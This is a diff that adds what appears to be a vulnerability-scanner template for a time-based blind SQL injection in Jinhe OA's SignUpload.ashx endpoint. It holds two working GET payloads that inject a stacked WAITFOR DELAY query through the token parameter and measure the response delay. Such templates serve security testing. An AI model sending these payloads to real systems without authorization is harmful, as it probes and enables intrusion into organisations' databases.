@@ -1,0 +1,17 @@
+name: 金和OA-SignUpload.ashx-sql
+description: >-
+  sql注入
+alwaysExecute: false
+timeout: 5
+matchCount: 2
+rules:
+  - method: GET
+    path: /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%205%27+--%20and%201=1_123_123&filename=1
+    expression:
+      status: 200
+      sleep: 5
+  - method: GET
+    path: /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%201%27+--%20and%201=1_123_123&filename=1
+    expression:
+      status: 200
+      sleep: 3
